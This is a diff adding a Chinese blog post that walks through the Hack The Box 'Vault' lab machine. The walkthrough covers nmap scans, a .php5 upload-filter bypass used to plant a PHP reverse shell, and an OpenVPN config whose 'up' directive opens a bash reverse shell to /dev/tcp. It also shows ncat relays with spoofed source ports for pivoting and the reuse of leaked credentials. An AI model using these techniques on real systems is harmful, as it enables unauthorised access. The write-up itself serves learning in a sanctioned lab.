@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>HTB靶机渗透实战Writeup_Vault | 放荡不羁混世间 | B1ngDa0在这儿舞剑</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="靶机writeup,hackthebox">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":true,"app_id":"5qFlGhUV7fo3sxC2cSHAeMwU-gzGzoHsz","app_key":"pIKFHOkquTOmXNwhTKx9vBnu","icon":true}'),
+            v: JSON.parse('{"enable":true,"appid":"5qFlGhUV7fo3sxC2cSHAeMwU-gzGzoHsz","appkey":"pIKFHOkquTOmXNwhTKx9vBnu","notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/about" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">B1ngDa0</h5>
+          <a href="mailto:B1ngDa0@08sec.org" title="B1ngDa0@08sec.org" class="mail">
+            
+              <span>B</span>
+            
+              <span>1</span>
+            
+              <span>n</span>
+            
+              <span>g</span>
+            
+              <span>D</span>
+            
+              <span>a</span>
+            
+              <span>0</span>
+            
+              <span>@</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>s</span>
+            
+              <span>e</span>
+            
+              <span>c</span>
+            
+              <span>.</span>
+            
+              <span>o</span>
+            
+              <span>r</span>
+            
+              <span>g</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/b1ngda0" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                ABOUT
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>HTB靶机渗透实战Writeup_Vault</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">HTB靶机渗透实战Writeup_Vault</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-07-07T08:59:17.000Z" itemprop="datePublished" class="page-time">
+  2019-07-07
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB靶机渗透实战Writeup/">HTB靶机渗透实战Writeup</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-HTB靶机渗透实战Writeup-Vault"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">HTB靶机渗透实战Writeup_Vault</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-07-07 16:59:17" datetime="2019-07-07T08:59:17.000Z"  itemprop="datePublished">2019-07-07</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTB靶机渗透实战Writeup/">HTB靶机渗透实战Writeup</a></li></ul>
+
+
+
+            
+	<span id="/2019/07/07/HTB靶机渗透实战Writeup-Vault/" class="leancloud_visitors" data-flag-title="HTB靶机渗透实战Writeup_Vault" title="HTB靶机渗透实战Writeup_Vault">
+		
+			<i class="icon icon-eye"></i>
+		
+		<span class="leancloud-visitors-count"></span>
+	</span>
+ 
+
+            
+    <span class="leancloud-comment">
+        <i class="icon icon-comment-o"></i>
+        <a href="/2019/07/07/HTB靶机渗透实战Writeup-Vault/#comment">
+            <span class="valine-comment-count" data-xid="/2019/07/07/HTB靶机渗透实战Writeup-Vault/"></span>
+        </a>
+    </span>
+
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="https://p3.ssl.qhimg.com/t01a41b0b2c748d22e6.png" title="" data-fancybox="images"><img src="https://p3.ssl.qhimg.com/t01a41b0b2c748d22e6.png" alt title class></a>
+                <p></p>
+            </figure>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>大家好,我是成都B1ngDa0，今天给大家带来HTB(hackthebox)的一个靶机：Vault的writeup，作为一篇自己回顾整理知识点以及分享给大家的文章，还望斧正。</p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>RedCross靶机地址: <a href="https://www.hackthebox.eu/home/machines/profile/161" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/161</a><br>目标IP: 10.10.10.109(Linux)<br>本机IP:10.10.14.43(Kali)<br>目标:获取user.txt以及root.txt(分别为获取目标的普通用户权限以及管理员权限)<br>信息收集<br>NMAP端口扫描<br>nmap -sC -sV -oA  nmap 10.10.10.109</p>
+<p>Nmap scan report for 10.10.10.109<br>Host is up (0.42s latency).<br>Not shown: 998 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)<br>|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)<br>|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Site doesn’t have a title (text/html; charset=UTF-8).<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+<p>访问80端口：<br>网站信息</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_33_41_83754" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_33_41_83754" alt title class></a>
+                <p></p>
+            </figure>
+<p>显示存在平台 sparklays<br>访问10.10.10.109/sparklays<br>403，直接进行目录爆破：</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_33_48_35141" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_33_48_35141" alt title class></a>
+                <p></p>
+            </figure>
+<p>整理：<br>changelogo.php(可上传图片)</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_33_56_75908" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_33_56_75908" alt title class></a>
+                <p></p>
+            </figure>
+<p>/uploads/ (为上传文件目录)</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_34_05_65063" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_34_05_65063" alt title class></a>
+                <p></p>
+            </figure>
+<p>获取反弹shell<br>尝试直接上传PHP文件：<br>失败<br>测试发现是黑名单检测，通过1234.php5绕过限制</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_34_13_70769" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_34_13_70769" alt title class></a>
+                <p></p>
+            </figure>
+<p>未直接找到地址，<br>我上传的是一个php反弹shell<br>使用nc监听1234端口并访问<br><a href="http://10.10.10.109/sparklays/design/uploads/1234.php5" target="_blank" rel="noopener">http://10.10.10.109/sparklays/design/uploads/1234.php5</a></p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_36_59_97273" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_36_59_97273" alt title class></a>
+                <p></p>
+            </figure>
+<p>反弹成功获得用户www-data的shell。<br>查看Home目录内并未发现user.txt，发现以下内容：</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_36_06_98456" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_36_06_98456" alt title class></a>
+                <p></p>
+            </figure>
+<p> DNS + Configurator - 192.168.122.4<br>Firewall - 192.168.122.5<br>The Vault – x<br>dave<br>Dav3therav3123<br>key内容:<br>itscominghome<br>发现主机存在网段192.168.122.x<br>通过ifconfig发现主机网段内ip为192.168.122.1<br>virbr0    Link encap:Ethernet  HWaddr fe:54:00:17:ab:49<br>          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0<br>发现nc可用 通过nc扫描192.168.122.4开放的端口<br>ifconfig<br>nc -z -v 192.168.122.4 1-100<br>Connection to 192.168.122.4 22 port [tcp/ssh] succeeded!<br>Connection to 192.168.122.4 80 port [tcp/http] succeeded!<br>发现主机开放22、80端口<br>并且之前在目录下发现了ssh用户dave的登录账号密码<br>SSH端口转发<br>通过ssh端口转发并访问本地端口8888(文献参考)<br>ssh -L 8888:192.168.122.4:80 <a href="mailto:dave@10.10.10.109" target="_blank" rel="noopener">dave@10.10.10.109</a></p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_35_48_93640" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_35_48_93640" alt title class></a>
+                <p></p>
+            </figure>
+<p>访问两个链接发现</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_38_07_99770" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_38_07_99770" alt title class></a>
+                <p></p>
+            </figure>
+<p>只有vpnconfig可用，但无其他信息，于是继续进行目录爆破<br>通过目录爆破发现/notes目录<br>并且提示有123.ovpn以及一个脚本<br>分别查看</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_38_20_88371" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_38_20_88371" alt title class></a>
+                <p></p>
+            </figure>
+<p>连接DNS<br>直接使用123.ovpn的内容在vpnconfigurator页面执行<br>remote 192.168.122.1<br>ifconfig 10.200.0.2 10.200.0.1<br>dev tun<br>script-security 2<br>nobind<br>up “/bin/bash -c ‘/bin/bash -i &amp;&gt; /dev/tcp/192.168.122.1/1337 0&gt;&amp;1’”</p>
+<p>ubuntu主机监听1337</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_38_51_97958" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_38_51_97958" alt title class></a>
+                <p></p>
+            </figure>
+<p>可看到已经获取DNF服务器的root，再次查看/home/dave发现user.txt<br>以及一个ssh账号密码与之前的有差异dav3gerous567<br>user权限拿下。</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_39_13_46502" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_39_13_46502" alt title class></a>
+                <p></p>
+            </figure>
+<p>获取Root<br>连接Vault<br>在ubantu机子上连接dave的ssh：<br>ssh <a href="mailto:dave@192.168.122.4" target="_blank" rel="noopener">dave@192.168.122.4</a></p>
+<p>查看文件<br>/etc/hosts<br>发现新ip<br>192.168.5.2<br>在/var/log/auth.log文件中发现有连接的方法</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_42_28_37331" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_42_28_37331" alt title class></a>
+                <p></p>
+            </figure>
+<p>可通过在DNS主机发现的DAVE凭据去登录192.168.5.2<br>对192.168.5.2进行端口扫描<br>nmap -Pn -sS -sU -T4 -p- 192.168.5.2<br>Starting Nmap 7.01 ( <a href="https://nmap.org" target="_blank" rel="noopener">https://nmap.org</a> ) at 2019-03-09 03:57 GMT<br>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using –system-dns or specify valid servers with –dns-servers<br>Nmap scan report for Vault (192.168.5.2) Host is up (0.0021s latency).<br>Not shown: 65535 open|filtered ports, 65533 filtered ports<br>PORT STATE SERVICE<br>53/tcp closed domain<br>4444/tcp closed krb524</p>
+<p>通过auto.log得知指定源端口继续扫描可以发现另一个开放端口<br>nmap 192.168.5.2 -Pn –source-port=4444 –f<br>Starting Nmap 7.01 ( <a href="https://nmap.org" target="_blank" rel="noopener">https://nmap.org</a> ) at 2019-03-09 03:57 GMT<br>mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using –system-dns or specify valid servers with –dns-servers<br>Nmap scan report for Vault (192.168.5.2) Host is up (0.0021s latency).<br>Not shown: 65535 open|filtered ports, 65533 filtered ports<br>PORT STATE SERVICE<br>987/tcp open unknown</p>
+<p>按照auto.log的方法操作：<br>ncat -l 5555 –sh-exec “ncat 192.168.5.2 987 -p 53” &amp;<br>netstat -antup<br>使用一个可用端口，在DNS上设置一个ncat侦听器，它将使用提供的源端口触发到Vault的连接。检查主机是否成功监听了该端口。</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_43_17_25963" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_43_17_25963" alt title class></a>
+                <p></p>
+            </figure>
+<p>已成功<br>并且发现是一个ssh服务 于是我们使用dave的账号登录<br>发现一个root.txt.gpg</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_44_14_25742" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_44_14_25742" alt title class></a>
+                <p></p>
+            </figure>
+<p>尝试解密gpg失败，没有密钥<br>在DNS机器上也没有密钥<br>在Ubantu主机上发现了相同的ID<br>gpg –list-keys<br>/home/dave/.gnupg/pubring.gpg<br>pub 4096R/0FDFBFE4 2018-07-24<br>uid david<br>sub 4096R/D1EB1F03 2018-07-24</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_44_35_67982" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_44_35_67982" alt title class></a>
+                <p></p>
+            </figure>
+<p>文件传输<br>使用scp将root.txt.gpg传输至ubantu主机<br>思路：<br>vault &gt; dns &gt; ubantu<br>在DNS主机上执行<br>sudo ncat -l 5555 –sh-exec “ncat 192.168.5.2 987 -p 4444” &amp;</p>
+<p>scp -P 5555 <a href="mailto:dave@192.168.122.4" target="_blank" rel="noopener">dave@192.168.122.4</a>:/home/dave/root.txt.gpg /tmp<br>在ubantu主机上执行<br>scp <a href="mailto:dave@192.168.122.4" target="_blank" rel="noopener">dave@192.168.122.4</a>:/tmp/root.txt.gpg .<br>这里需要一个key<br>就是一开始得到的key: itscominghome<br>获得root.txt:</p>
+<figure class="image-box">
+                <a rel=HTB靶机渗透实战Writeup_Vault href="http://bbs.08sec.org/upload/images/201907/21_44_51_49197" title="" data-fancybox="images"><img src="http://bbs.08sec.org/upload/images/201907/21_44_51_49197" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>个人感悟<br>Vault靶机，user.txt获取很简单，只考察一点枚举能力。在root.txt获取上比较麻烦，得找到并理清关系，主机存在Ubantu上，可通过openvpn连接至DNS主机，通过auth.log知道Vault主机，root.txt存在于Vault主机并进行了gpg加密，通过密钥的寻找，确定在ubantu使用key上解密即可得到root.txt<br>文献参考<br>ssh隧道：<a href="https://www.ssh.com/ssh/tunneling/example" target="_blank" rel="noopener">https://www.ssh.com/ssh/tunneling/example</a><br>从OpenVPN配置文件获取反弹shell：<a href="https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da" target="_blank" rel="noopener">https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da</a><br>GPG Keys Cheatsheet：<br><a href="https://easyengine.io/tutorials/linux/gpg-keys" target="_blank" rel="noopener">https://easyengine.io/tutorials/linux/gpg-keys</a><br>scp跨机远程拷贝：<br><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/scp.html" target="_blank" rel="noopener">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/scp.html</a></p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-08-02T03:52:24.955Z" itemprop="dateUpdated">2019-08-02 11:52:24</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/07/07/HTB靶机渗透实战Writeup-Vault/" target="_blank" rel="external">https://www.b1ngda0.cn/2019/07/07/HTB靶机渗透实战Writeup-Vault/</a>
+        
+    </div>
+    <footer>
+        <a href="https://www.b1ngda0.cn">
+            <img src="/img/avatar.jpg" alt="B1ngDa0">
+            B1ngDa0
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackthebox/">hackthebox</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/靶机writeup/">靶机writeup</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.b1ngda0.cn/2019/07/07/HTB靶机渗透实战Writeup-Vault/&title=《HTB靶机渗透实战Writeup_Vault》 — 放荡不羁混世间&pic=https://www.b1ngda0.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.b1ngda0.cn/2019/07/07/HTB靶机渗透实战Writeup-Vault/&title=《HTB靶机渗透实战Writeup_Vault》 — 放荡不羁混世间&source=分享自己在网络安全方面的领悟，目前处于web安全以及靶机阶段" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+    <div id="comment"></div>
+
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/07/08/HTB靶机渗透实战Writeup-RedCross/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">HTB靶机渗透实战Writeup_RedCross</h4>
+      </a>
+    </div>
+  
+
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#前言"><span class="post-toc-number">1.</span> <span class="post-toc-text">前言</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#实战"><span class="post-toc-number">2.</span> <span class="post-toc-text">实战</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://www.b1ngda0.cn" target="_blank">HOME</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                B1ngDa0 &copy; 2019
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://www.b1ngda0.cn/2019/07/07/HTB靶机渗透实战Writeup-Vault/&title=《HTB靶机渗透实战Writeup_Vault》 — 放荡不羁混世间&pic=https://www.b1ngda0.cn/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://www.b1ngda0.cn/2019/07/07/HTB靶机渗透实战Writeup-Vault/&title=《HTB靶机渗透实战Writeup_Vault》 — 放荡不羁混世间&source=分享自己在网络安全方面的领悟，目前处于web安全以及靶机阶段" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACu0lEQVR42u3aUW7jMAwE0N7/0u0BtnFmSKnIAs9fQdoqei5gMUN+fcXX94vr1U+f10k+5d/ff/7b1YWHh4d3aOvPgGfS8zuvVk72me8ZDw8P7zYvWa5dOjkw2nXyPePh4eF9Ji8/BpISPL9BeHh4eP8Xry2dk4K7JeHh4eF9Ai8JI9pId7atvKQ+nLXg4eHhxby8i/Q5r6/09/Dw8PDWXfU2Wp09stsAotgtHh4e3gVe/sBtMXl53bbH6n3i4eHhHeVtDobZyNQm5miDYDw8PLwbvHaL7ejA7DeThlnRVMPDw8O7wEsa/7MooR0maFtx7YGBh4eHd5aXbGLW/m9j2VkBPfy/4eHh4ZW8WSybx6zt8TBb8+U+8fDw8C7w2oMhoT4X1vkh0RbNb1bAw8PDO8TLR5pmTay2us+jiugww8PDw7vA2zfAZkMDz7dm33471t/Dw8PDiz84D1jzB3pbds/i4F+yFjw8PLyjvP1gUzsWkGx6duQU41Z4eHh4h3ibKDaH5Z+7CYvx8PDw7vHawHQWE2zC2U0bDA8PD+8er/2Sn9yCs6NabSSBh4eH9ze8fDigLceTcjkvo4uiHA8PD+8ar318z17n8W57FBUzZXh4eHhr3vBL/iKe2Fz57cbDw8P7G15e4LaFb942ywOO+obi4eHhHeVtHriz99sSPGmGvTnr8PDw8C7w8qXzgKDdSht/FJU4Hh4e3jVe/vBty9+8sJ4FGXW+goeHhzfifZdXEkO0I1nJwZD/9OVkBB4eHt4h3r6VlZfUbeN/M7KAh4eHd5s3Wzo/Ns6OCNQlOB4eHt41XhLvtoFsfjs2t+nNsYSHh4f3Abx9YZ3HxAduNx4eHt7H8NpW1iz2PVDK4+Hh4V3j5YVvu/W26dU25FYDBHh4eHjzrv3qC//zonkZne8hL9bx8PDwjvJ+AAbrc6iKP2pHAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.2"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.2"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.2"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.2"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script type="text/javascript" src="/js/plugins/valine.js?v=1.4.2"></script>
+    
+    
+
+
+
+<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.4.2"></script>
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+
+
+
+    
+</body>
+</html>
